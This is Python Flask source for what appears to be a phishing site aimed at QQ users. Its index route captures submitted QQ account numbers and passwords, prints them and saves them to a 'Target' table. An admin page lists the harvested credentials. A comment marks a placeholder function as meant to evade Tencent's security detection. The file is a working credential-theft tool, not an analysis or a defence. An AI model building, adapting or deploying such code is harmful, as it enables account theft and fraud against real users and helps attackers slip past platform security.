from flask import render_template, request, redirect, url_for, session, flash
# from decorators import login_required
from config import app
from models import User, Target
from exts import db

#用于逃逸腾讯安全检测
# def escape():
#     return

@app.route('/', methods=['GET', 'POST'])
# @login_required
def index():
    if request.method == 'GET':
        return render_template('index.html')
    else:
        username=request.form.get("account")
        password=request.form.get("password")
        saveprofile(username,password)
        print("QQ号:{} 密码:{}".format(username,password))
        return render_template('index.html')



@app.route('/login/', methods=['GET', 'POST'])
# @login_required
def adminlogin():
    if request.method == 'GET':
        return render_template('administrator-login.html')
    else:
        email = request.form.get('email')
        remeber = request.form.get('remeber')
        password = request.form.get('password')
        user = User.query.filter(User.email == email).first()
        if user and user.check_password(password):
            if remeber:
                session.permanent = True
            session['user_id'] = user.id
            return redirect(url_for('adminindex'))
        else:
            flash("邮箱或密码输入错误")
            return render_template('administrator-login.html')

@app.route('/adminindex/<int:page>', methods=['GET', 'POST'])
@app.route('/adminindex', methods=['GET', 'POST'])
# @login_required
def adminindex(page=None):
    if not page:
        page = 1
    per_page = 20
    try:
        paginate = Target.query.order_by(Target.date.desc()).paginate(page, per_page, error_out=False)
    except:
        paginate = Target.query.paginate(page, per_page, error_out=False)
    targetlist = paginate.items
    return render_template('target.html', paginate=paginate, targetlist=targetlist)


def saveprofile(username,password):
    target = Target(username=username, password=password)
    db.session.add(target)
    db.session.commit()


if __name__ == '__main__':
    app.run()